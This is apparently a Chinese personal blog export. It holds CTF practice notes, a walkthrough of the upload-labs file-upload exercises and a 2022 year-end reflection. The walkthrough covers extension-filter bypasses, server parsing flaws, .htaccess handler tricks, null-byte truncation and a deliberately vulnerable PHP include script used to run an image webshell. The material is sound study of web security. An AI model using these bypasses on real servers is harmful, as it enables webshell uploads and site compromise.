                     data-src="https://img-blog.csdnimg.cn/20200319211301864.PNG?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0RVT2FuMDIxNg==,size_16,color_FFFFFF,t_70"
                     
                ></p>
<p>此外，还可以有别的方法访问得到文件</p>
<p>show_source(‘flag.php’);</p>
<p>print_r(file_get_contents(‘flag.php’));</p>
<p>cat flag.php;</p>
<hr>
<p>一点小tips</p>
<p>linux   cat ：是把文件内容打印到标准输出</p>
<p>php   system:是把系统命令的执行结果输出出来</p>
<p>php  在打印字符串的时候  如果字符串是以&lt;?开头的  那么会被注释掉  同时遇到&gt;注释才结束</p>
<p>收获颇深！</p>
<h2 id="2020-03-20"><a href="#2020-03-20" class="headerlink" title="2020.03.20"></a>2020.03.20</h2><p>今日题目 写了两道题 但是有一道题目我实在不理解算了吧</p>
<p>写写今天的垃圾题目：</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://img-blog.csdnimg.cn/20200320185323206.PNG?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0RVT2FuMDIxNg==,size_16,color_FFFFFF,t_70"
                     
                ></p>
<p>讲真，我看了题目 也猜想过</p>
<p>结果我以为sql注入。。。  很像有没有？！</p>
<p>回过头来 看题  首先所有数据都被删除了  那么sql注入是注入不出来的！</p>
<p>【有一说一 的确 我当时order by 100000都还有显示。。</p>
<p>那么看网上的wp 提示爆破。</p>
<p>【这题也太无聊了</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://img-blog.csdnimg.cn/202003201858583.PNG?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0RVT2FuMDIxNg==,size_16,color_FFFFFF,t_70"
                     
                ></p>
<p>周末打比赛 以赛代练！ 加油叭。</p>
<h2 id="2020-03-22"><a href="#2020-03-22" class="headerlink" title="2020.03.22"></a>2020.03.22</h2><h3 id="ACTF2020-新生赛-BackupFile"><a href="#ACTF2020-新生赛-BackupFile" class="headerlink" title="[ACTF2020 新生赛]BackupFile"></a>[ACTF2020 新生赛]BackupFile</h3><p>这道题目 就了解很多了</p>
<p>首先源码泄露 用 dirsearch扫描 </p>
<p>扫描指令： <code>./dirsearch.py -u &quot;www.xxxx.com&quot;</code> -e *</p>
<p>注意到 在URL后面不要填上<code>/</code>这个</p>
<p>不然会出现扫不出来！。。。 这个很气。</p>
<p>之后我们扫到<code>/index.php.bak</code>这个   下载源码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include_once</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;key&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$key</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;key&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$key</span>)) &#123;</span><br><span class="line">        <span class="keyword">exit</span>(<span class="string">&quot;Just num!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$key</span> = <span class="title function_ invoke__">intval</span>(<span class="variable">$key</span>);</span><br><span class="line">    <span class="variable">$str</span> = <span class="string">&quot;123ffwsfwefwf24r2f32ir23jrw923rskfjwtsw54w3&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$key</span> == <span class="variable">$str</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Try to find out source file!&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>很明显 PHP黑魔法</p>
<p>我们再来解析解析！</p>
<p>函数介绍：</p>
<p>is_numeric — 检测变量是否为数字或数字字符串</p>
<p>如果 <code>var</code> 是数字和数字字符串则返回 **<code>TRUE</code>**，否则返回 **<code>FALSE</code>**。</p>
<p>intval — 获取变量的整数值</p>
<p>通过使用指定的进制 <code>base</code> 转换（默认是十进制），返回变量 <code>var</code> 的 <a class="link"   href="https://www.php.net/manual/zh/language.types.integer.php" >integer<i class="fas fa-external-link-alt"></i></a> 数值</p>
<p>strcmp — 二进制安全字符串比较</p>
<p>注意该比较区分大小写。如果 <code>str1</code> 小于 <code>str2</code> 返回 &lt; 0； 如果 <code>str1</code> 大于 <code>str2</code> 返回 &gt; 0；如果两者相等，返回 0。</p>
<hr>
<p>这道题目呢，<code>==</code>弱比较  字符串和数字比较的时候，字符串只取到数字。</p>
]]></content>
      <categories>
        <category>刷题</category>
      </categories>
  </entry>
  <entry>
    <title>文件上传-专题</title>
    <url>/2020/04/19/CTFcomig/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-%E4%B8%93%E9%A2%98/</url>
    <content><![CDATA[<h2 id="upload-libs"><a href="#upload-libs" class="headerlink" title="upload libs"></a>upload libs</h2><p><img  
                     lazyload
                     alt="image"
                     data-src="https://img-blog.csdnimg.cn/20190708194057850.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzkwMTAzOA==,size_16,color_FFFFFF,t_70"
                      alt="img"
                ></p>
<span id="more"></span>







<p><img  
                     lazyload
                     alt="image"
                     data-src="https://img-blog.csdnimg.cn/20190708194236879.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzkwMTAzOA==,size_16,color_FFFFFF,t_70"
                      alt="在这里插入图片描述"
                ></p>
<h3 id="pass1"><a href="#pass1" class="headerlink" title="pass1"></a>pass1</h3><p>仅仅前端检验</p>
<h3 id="pass2"><a href="#pass2" class="headerlink" title="pass2"></a>pass2</h3><p>MIME绕过</p>
<h3 id="pass3"><a href="#pass3" class="headerlink" title="pass3"></a>pass3</h3><p>这一关我们可以利用</p>
<p>Php1,phtml ,php3,php4,php5,pht</p>
<p>也可以利用<code>.htaccess</code>进行处理</p>
<h3 id="pass4"><a href="#pass4" class="headerlink" title="pass4"></a>pass4</h3><p>利用<code>.htaccess</code>进行处理</p>
<p>因为它取的是在<code>.</code>之后的数据</p>
<p>那么我们可以构造<code>.php.xxx</code></p>
<p>也可以写成<code>.php. . </code></p>
<h3 id="pass5"><a href="#pass5" class="headerlink" title="pass5"></a>pass5</h3><p>一样可以利用</p>
<p>因为它取的是在<code>.</code>之后的数据</p>
<p>那么我们可以构造<code>.php.xxx</code></p>
<p>也可以写成<code>.php. . </code></p>
<h3 id="pass6"><a href="#pass6" class="headerlink" title="pass6"></a>pass6</h3><p>它是匹配不是正则</p>
<p>所以我们可以利用.php空格空格空格</p>
<p>这样的方式来进行操作</p>
<h3 id="pass7"><a href="#pass7" class="headerlink" title="pass7"></a>pass7</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$file_ext</span> = <span class="title function_ invoke__">strrchr</span>(<span class="variable">$file_name</span>, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line"><span class="variable">$file_ext</span> = <span class="title function_ invoke__">strtolower</span>(<span class="variable">$file_ext</span>); <span class="comment">//转换为小写</span></span><br><span class="line"><span class="variable">$file_ext</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="string">&#x27;::$DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$file_ext</span>);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line"><span class="variable">$file_ext</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$file_ext</span>); <span class="comment">//首尾去空</span></span><br></pre></td></tr></table></figure>

<p>黑名单很多情况下都没什么用处</p>
<p>加<code>.</code>就可以去掉 特别是利用&#96;.php.空格空格.</p>
<p>方法二：利用Windows解析漏洞（后缀修改为1.php:1.jpg）</p>
<h4 id="文件解析部分"><a href="#文件解析部分" class="headerlink" title="文件解析部分"></a>文件解析部分</h4><h5 id="一、IIS-5-x-x2F-6-0解析漏洞-03"><a href="#一、IIS-5-x-x2F-6-0解析漏洞-03" class="headerlink" title="一、IIS 5.x&#x2F;6.0解析漏洞(03)"></a>一、IIS 5.x&#x2F;6.0解析漏洞(03)</h5><p>IIS 6.0解析利用方法有两种</p>
<p>1.目录解析</p>
<p>&#x2F;xx.asp&#x2F;xx.jpg</p>
<p>在网站下简历文件夹为.asp、.asa的文件夹，其目录内的任何文件扩展名的文件都会被IIS当做asp文件来执行</p>
<p>例如目录 hahaha.asp，那么&#x2F;hahaha.asp&#x2F;1.jpg 一个jpg格式的文件就会被当做asp脚本文件来解析执行，假设黑客可以控制问上传文件的文件夹路径，就可以绕过上传格式拿到shell</p>
<p>一般目录解析漏洞跟编辑器搭配利用，比如ckfinder，fck编辑器，都是可以创建目录的。</p>
<p>2.文件解析（；）</p>
<p>hahaha.asp;.jpg</p>
<p>在IIS6.0下，分号后面的不被解析，也就是说hahaha.asp;.jpg会被服务器看成是hahaha.asp</p>
<p>3.畸形后缀名解析<br>IIS6.0 默认的可执行文件除了asp还包含这三种(特定的情况下被解析）：</p>
<p>&#x2F;hahaha.asa<br>&#x2F;hahaha.cer<br>&#x2F;hahaha.cdx</p>
<h5 id="二、IIS-7-0-x2F-IIS-7-5-x2F-Nginx-lt-8-03畸形解析漏洞"><a href="#二、IIS-7-0-x2F-IIS-7-5-x2F-Nginx-lt-8-03畸形解析漏洞" class="headerlink" title="二、IIS 7.0&#x2F;IIS 7.5&#x2F; Nginx &lt;8.03畸形解析漏洞"></a>二、IIS 7.0&#x2F;IIS 7.5&#x2F; Nginx &lt;8.03畸形解析漏洞</h5><p>Nginx解析漏洞这个伟大的漏洞是我国安全组织80sec发现的…</p>
<p>在默认Fast-CGI开启状况下,黑阔上传一个名字为hahaha.jpg，内容为： ‘);?&gt;的文件，然后访问hahaha.jpg&#x2F;.php,在这个目录下就会生成一句话木马 shell.php。(这个漏洞貌似不是容器的漏洞，而是php的漏洞，因为不止IIS7,0&#x2F;7.5才有，甚至10.0也有出现)</p>
<h5 id="三、Nginx-lt-8-03-空字节代码执行漏洞"><a href="#三、Nginx-lt-8-03-空字节代码执行漏洞" class="headerlink" title="三、Nginx &lt;8.03 空字节代码执行漏洞"></a>三、Nginx &lt;8.03 空字节代码执行漏洞</h5><p>影响版:0.5.,0.6., 0.7 &lt;&#x3D; 0.7.65, 0.8 &lt;&#x3D; 0.8.37</p>
<p>Nginx在图片中嵌入PHP代码然后通过访问</p>
<p>xxx.jpg.php</p>
<p>来执行其中的代码</p>
<h5 id="四、Apache解析漏洞"><a href="#四、Apache解析漏洞" class="headerlink" title="四、Apache解析漏洞"></a>四、Apache解析漏洞</h5><p>Apache 是从右到左开始判断解析,如果为不可识别解析,就再往左判断.</p>
<p>比如 hahaha.php.owf.rar “.owf”和”.rar” 这两种后缀是apache不可识别解析,apache就会把hahaha.php.owf.rar解析成php.</p>
<p>如何判断是不是合法的后缀就是这个漏洞的利用关键,测试时可以尝试上传一个hahaha.php.rara.jpg.png…（把你知道的常见后缀都写上…）去测试是否是合法后缀</p>
<h5 id="五、其他"><a href="#五、其他" class="headerlink" title="五、其他"></a>五、其他</h5><p><strong>在windows环境下，xx.jpg[空格] 或xx.jpg. 这两类文件都是不允许存在的，若这样命名，windows会默认除去空格或点,黑客可以通过抓包，在文件名后加一个空格或者点绕过黑名单.若上传成功，空格和点都会被windows自动消除,这样也可以getshell。</strong></p>
<p>我们刚刚就是一直用这个方式</p>
<p>如果在Apache中.htaccess可被执行.且可被上传.那可以尝试在.htaccess中写入:</p>
<p>SetHandler application&#x2F;x-httpd-php</p>
<p>然后再上传shell.jpg的木马, 这样shell.jpg就可解析为php文件</p>
<h3 id="pass8"><a href="#pass8" class="headerlink" title="pass8"></a>pass8</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$file_name</span> = <span class="title function_ invoke__">deldot</span>(<span class="variable">$file_name</span>);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line"><span class="variable">$file_ext</span> = <span class="title function_ invoke__">strrchr</span>(<span class="variable">$file_name</span>, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line"><span class="variable">$file_ext</span> = <span class="title function_ invoke__">strtolower</span>(<span class="variable">$file_ext</span>); <span class="comment">//转换为小写</span></span><br><span class="line"><span class="variable">$file_ext</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$file_ext</span>); <span class="comment">//首尾去</span></span><br></pre></td></tr></table></figure>

<p>这个也是这样 就是去掉了文件末尾第一个点</p>
<p>那么我们可以变为<code>.php.  .   .</code></p>
<p>那么我们就可以使用</p>
<p><code>.php::$DATA</code>进行绕过</p>
<h4 id="部分知识"><a href="#部分知识" class="headerlink" title="部分知识"></a>部分知识</h4><h5 id="特殊文件名绕过"><a href="#特殊文件名绕过" class="headerlink" title="特殊文件名绕过"></a>特殊文件名绕过</h5><figure class="highlight text"><table><tr><td class="code"><pre><span class="line">比如发送的 http包里把文件名改成 test.asp. 或 test.asp_(下划线为空格)，这种命名方式</span><br><span class="line">在windows系统里是不被允许的，所以需要在 burp之类里进行修改，然后绕过验证后，会</span><br><span class="line">被windows系统自动去掉后面的点和空格，但要注意Unix/Linux系统没有这个特性。</span><br></pre></td></tr></table></figure>

<h5 id="Windows流特性绕过"><a href="#Windows流特性绕过" class="headerlink" title="Windows流特性绕过"></a>Windows流特性绕过</h5><figure class="highlight text"><table><tr><td class="code"><pre><span class="line">php在window的时候如果文件名+&quot;::DATA&quot;会把::DATA之后的数据当成文件流处理,不会检测后缀名.且保持&quot;::DATA之后的数据当成文件流处理,不会检测后缀名.且保持&quot;::DATA之后的数据当成文件流处理,不会检测后缀名.&quot;::DATA&quot;之前的文件名保持 他的目的就是不检查后缀名。ps:只能是Windows系统，并且只能时php文件</span><br></pre></td></tr></table></figure>

<h3 id="pass9"><a href="#pass9" class="headerlink" title="pass9"></a>pass9</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$file_name</span> = <span class="title function_ invoke__">deldot</span>(<span class="variable">$file_name</span>);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line"><span class="variable">$file_ext</span> = <span class="title function_ invoke__">strrchr</span>(<span class="variable">$file_name</span>, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line"><span class="variable">$file_ext</span> = <span class="title function_ invoke__">strtolower</span>(<span class="variable">$file_ext</span>); <span class="comment">//转换为小写</span></span><br><span class="line"><span class="variable">$file_ext</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="string">&#x27;::$DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$file_ext</span>);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line"><span class="variable">$file_ext</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$file_ext</span>); <span class="comment">//首尾去空</span></span><br></pre></td></tr></table></figure>

<p>还是点空点操作</p>
<h3 id="pass10"><a href="#pass10" class="headerlink" title="pass10"></a>pass10</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;php&quot;</span>,<span class="string">&quot;php5&quot;</span>,<span class="string">&quot;php4&quot;</span>,<span class="string">&quot;php3&quot;</span>,<span class="string">&quot;php2&quot;</span>,<span class="string">&quot;html&quot;</span>,<span class="string">&quot;htm&quot;</span>,<span class="string">&quot;phtml&quot;</span>,<span class="string">&quot;jsp&quot;</span>,<span class="string">&quot;jspa&quot;</span>,<span class="string">&quot;jspx&quot;</span>,<span class="string">&quot;jsw&quot;</span>,<span class="string">&quot;jsv&quot;</span>,<span class="string">&quot;jspf&quot;</span>,<span class="string">&quot;jtml&quot;</span>,<span class="string">&quot;asp&quot;</span>,<span class="string">&quot;aspx&quot;</span>,<span class="string">&quot;asa&quot;</span>,<span class="string">&quot;asax&quot;</span>,<span class="string">&quot;ascx&quot;</span>,<span class="string">&quot;ashx&quot;</span>,<span class="string">&quot;asmx&quot;</span>,<span class="string">&quot;cer&quot;</span>,<span class="string">&quot;swf&quot;</span>,<span class="string">&quot;htaccess&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$file_name</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line"><span class="variable">$file_name</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="variable">$deny_ext</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$file_name</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>], <span class="variable">$UPLOAD_ADDR</span> . <span class="string">&#x27;/&#x27;</span> . <span class="variable">$file_name</span>)) &#123;</span><br><span class="line">    <span class="variable">$img_path</span> = <span class="variable">$UPLOAD_ADDR</span> . <span class="string">&#x27;/&#x27;</span> .<span class="variable">$file_name</span>;</span><br><span class="line">    <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里看到是把php变为空</p>
<p>并没有正则或者判断存在</p>
<p>所以正常的双写绕过</p>
<p><code>.phphpp</code>直接绕过over</p>
<h3 id="pass11"><a href="#pass11" class="headerlink" title="pass11"></a>pass11</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$ext_arr</span> = <span class="keyword">array</span>(<span class="string">&#x27;jpg&#x27;</span>,<span class="string">&#x27;png&#x27;</span>,<span class="string">&#x27;gif&#x27;</span>);</span><br><span class="line"><span class="variable">$file_ext</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>],<span class="title function_ invoke__">strrpos</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>],<span class="string">&quot;.&quot;</span>)+<span class="number">1</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">in_array</span>(<span class="variable">$file_ext</span>,<span class="variable">$ext_arr</span>))&#123;</span><br><span class="line">    <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">    <span class="variable">$img_path</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;save_path&#x27;</span>].<span class="string">&quot;/&quot;</span>.<span class="title function_ invoke__">rand</span>(<span class="number">10</span>, <span class="number">99</span>).<span class="title function_ invoke__">date</span>(<span class="string">&quot;YmdHis&quot;</span>).<span class="string">&quot;.&quot;</span>.<span class="variable">$file_ext</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>,<span class="variable">$img_path</span>))&#123;</span><br><span class="line">        <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>终于到白名单了</p>
<p>这道题目的利用点在于<code>$_GET</code>传参这里，我们的目录是可动态构造的</p>
<p>那么我们这里使用<code>$_GET[&#39;save_path&#39;]=/../upload/liduoan.php%00</code></p>
<p>可是这里有限制</p>
<p>需要两个条件</p>
<p>php版本小于5.3.4</p>
<p>php的magic_quotes_gpc为OFF状态</p>
<p>如果要完成这一个题目就必须要实现上面的两个条件</p>
<p>但是现在都PHP7了，这东西也就很少见了，满足上面的条件的时候php就是把它当成结束符，后面的数据直接忽略，这也导致了很多的问题，文件包含也可以利用这一点。</p>
<h3 id="pass12"><a href="#pass12" class="headerlink" title="pass12"></a>pass12</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$ext_arr</span> = <span class="keyword">array</span>(<span class="string">&#x27;jpg&#x27;</span>,<span class="string">&#x27;png&#x27;</span>,<span class="string">&#x27;gif&#x27;</span>);</span><br><span class="line">   <span class="variable">$file_ext</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>],<span class="title function_ invoke__">strrpos</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>],<span class="string">&quot;.&quot;</span>)+<span class="number">1</span>);</span><br><span class="line">   <span class="keyword">if</span>(<span class="title function_ invoke__">in_array</span>(<span class="variable">$file_ext</span>,<span class="variable">$ext_arr</span>))&#123;</span><br><span class="line">       <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">       <span class="variable">$img_path</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;save_path&#x27;</span>].<span class="string">&quot;/&quot;</span>.<span class="title function_ invoke__">rand</span>(<span class="number">10</span>, <span class="number">99</span>).<span class="title function_ invoke__">date</span>(<span class="string">&quot;YmdHis&quot;</span>).<span class="string">&quot;.&quot;</span>.<span class="variable">$file_ext</span>;</span><br><span class="line"></span><br><span class="line">       <span class="keyword">if</span>(<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>,<span class="variable">$img_path</span>))&#123;</span><br><span class="line">           <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">       &#125;</span><br></pre></td></tr></table></figure>

<p>这道题目就是改成了<code>$_POST</code>传参数</p>
<p>和前面那道题目一样</p>
<p>上传图片马后为如下</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://img-blog.csdnimg.cn/20190708083738417.png"
                      alt="在这里插入图片描述"
                ></p>
<p>然后在上面的upload 的后面加上 XXX.php+（这里的XXX可以为任何名字，他只是一个代号。并且 php后面的 + 好也是一个标记，他的二进制代码为 2b）</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://img-blog.csdnimg.cn/20190708083838409.png"
                      alt="在这里插入图片描述"
                ></p>
<p>由上可知，将二进制中的 + 改为 00 截断，即将 + 的二进制码 2b 改为 00 .</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://img-blog.csdnimg.cn/20190708084257270.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzkwMTAzOA==,size_16,color_FFFFFF,t_70"
                      alt="在这里插入图片描述"
                ></p>
<h3 id="pass13"><a href="#pass13" class="headerlink" title="pass13"></a>pass13</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getReailFileType</span>(<span class="params"><span class="variable">$filename</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">fopen</span>(<span class="variable">$filename</span>, <span class="string">&quot;rb&quot;</span>);</span><br><span class="line">    <span class="variable">$bin</span> = <span class="title function_ invoke__">fread</span>(<span class="variable">$file</span>, <span class="number">2</span>); <span class="comment">//只读2字节</span></span><br><span class="line">    <span class="title function_ invoke__">fclose</span>(<span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$strInfo</span> = @<span class="title function_ invoke__">unpack</span>(<span class="string">&quot;C2chars&quot;</span>, <span class="variable">$bin</span>);    </span><br><span class="line">    <span class="variable">$typeCode</span> = <span class="title function_ invoke__">intval</span>(<span class="variable">$strInfo</span>[<span class="string">&#x27;chars1&#x27;</span>].<span class="variable">$strInfo</span>[<span class="string">&#x27;chars2&#x27;</span>]);    </span><br><span class="line">    <span class="variable">$fileType</span> = <span class="string">&#x27;&#x27;</span>;    </span><br><span class="line">    <span class="keyword">switch</span>(<span class="variable">$typeCode</span>)&#123;      </span><br><span class="line">        <span class="keyword">case</span> <span class="number">255216</span>:            </span><br><span class="line">            <span class="variable">$fileType</span> = <span class="string">&#x27;jpg&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">13780</span>:            </span><br><span class="line">            <span class="variable">$fileType</span> = <span class="string">&#x27;png&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>;        </span><br><span class="line">        <span class="keyword">case</span> <span class="number">7173</span>:            </span><br><span class="line">            <span class="variable">$fileType</span> = <span class="string">&#x27;gif&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:            </span><br><span class="line">            <span class="variable">$fileType</span> = <span class="string">&#x27;unknown&#x27;</span>;</span><br><span class="line">        &#125;    </span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$fileType</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这道题目，它查看了图片的内容，我们利用幻术头绕过</p>
<p>但是写到这我就不会了</p>
<p>结果居然是我们自己写个文件包含。。。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="keyword">include</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>这样我们就可以直接</p>
<p><code>/include.php/?page=xxxxxx.jpg</code></p>
<p>说明了图片马要么利用解析漏洞，要么利用文件包含</p>
<h3 id="pass14"><a href="#pass14" class="headerlink" title="pass14"></a>pass14</h3><p>同样幻术头马上传配合文件包含</p>
]]></content>
      <categories>
        <category>安全</category>
      </categories>
  </entry>
  <entry>
    <title>2022年终总结</title>
    <url>/2023/01/14/2023/2022%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/</url>
    <content><![CDATA[<h1 id="2022年总结"><a href="#2022年总结" class="headerlink" title="2022年总结"></a>2022年总结</h1><blockquote>
<p>世之奇伟、瑰怪，非常之观，常在于险远，而人之所罕至焉，故非有志者不能至也。</p>
</blockquote>
<p>在今年之前，我都是一个学生，无论从思想还是行为，总是想着</p>
<p>我没完成任务也没有什么吧，我还刚刚来呢，还没毕业呢，还有好多好多的退路呢。</p>
<p>虽然偶尔有激动、兴奋的想法，但是也不会持续性的，努力的为之奋斗，以惫懒的态度度过每一天。</p>
<p>但是今年之后，好像有什么改变。</p>
<h1 id="持续性的幸福"><a href="#持续性的幸福" class="headerlink" title="持续性的幸福"></a>持续性的幸福</h1><p>我常常在思考，如何将生活过的有意义。但是意义本身是没有意义的。</p>
<p>我需要去寻找，什么东西是我想要的，什么是我期待的。同时也去寻找怎样能够获得我想要的东西。</p>
<p>听起来很虚对不对？我也这么认为，虚的东西只能够定下大方向、而具体的东西需要沿着大方向去寻找。</p>
<p>我暂时的思路是持续性的学习，持续性的积极、不会惫懒和昏沉。</p>
<p>我询问过人工智能：该如何提高幸福度？</p>
<p>他告诉我：</p>
<ul>
<li>学会放松、每天的生活中要坚持放松、强调精神健康，用更大的容量去体验生活</li>
<li>和朋友们联系：与朋友们进行定期的交流、可以消除孤独感</li>
<li>多参与各种活动：多参加一些自己感兴趣的活动，参与者会对此保持热情，从而提升快乐感受</li>
<li>多锻炼：锻炼又处于改善心理状态、增强体能，提升幸福度。</li>
</ul>
<p>发现了吗？他的答案实际上全是如何让精神更为富足，更为稳定和放松。</p>
<p>寻求精神上的解脱，其实和将生活过的有意义是一样的。我需要做的只是让自己快乐，不是低级的、快餐式的快乐。而是一种持续性的、精神上的幸福。</p>
<p>在十一月之前，我并没有上述清晰的概念，我的理解上只是：如果我开心我就去做。</p>
<h1 id="2022"><a href="#2022" class="headerlink" title="2022"></a>2022</h1><p>今年的主旋律是毕业和工作。</p>
<p>今年一月份拿到offer，二月份去实习。</p>
<p>老板给我的感官还是不错的，实习的体验上也很好，有同事全程帮助我解决了各种问题。在这个实习上，我觉得我的整体思想和工作经验都比腾讯时得到了更大的成长。其中有实习时长的原因，也有具体业务的原因。</p>
<p>在大规模、合作式的项目迭代中，需求增长中、数据分析中，我确实更加的明白了一个开发工程师应该有的基本素养。这其实就是工作上成长了，在这里就不细说，简而言之，数据才是对开发而言更为重要的东西，功能的完成并不复杂，设计模式的掌握更为重要，思考的边界和限制在整体的大局上需要充分的把控。</p>
<p>二月到六月都在实习中度过、期间由于疫情的原因，不能够回到学校毕业，没有见到sjx、也没有见到舍友们，但是我也明白其实大家见面的次数会越来越少，只是没有好好的告别总给我一种没有毕业的错觉，没有完成精神上的阶段结束。为此我准备23年去南京逛逛，结束我的记忆。</p>
<p>同时在这个时间段内，也完成了我的毕业论文，非常幸运的认识到了我的导师、非常负责，也很有耐心，帮助我顺利的毕业。说实话，感觉写论文没啥意思，代码上的感知不够好，非工程类的代码给我的激励没有很强。尤其是我不准备读研的情况下，这个更加没啥意思了hh。</p>
<p> 六月到七月在家里休息，同时和好朋友们约了毕业旅行，整体上还是很开心的，和朋友们的见面能够给我带来精神上的快乐。我还是想和朋友们能够再次的去旅行！!</p>
<p>之后就继续工作了呜呜呜。工作的内容上其实不难，主要是思路清晰，能够完成相应的需求更迭。</p>
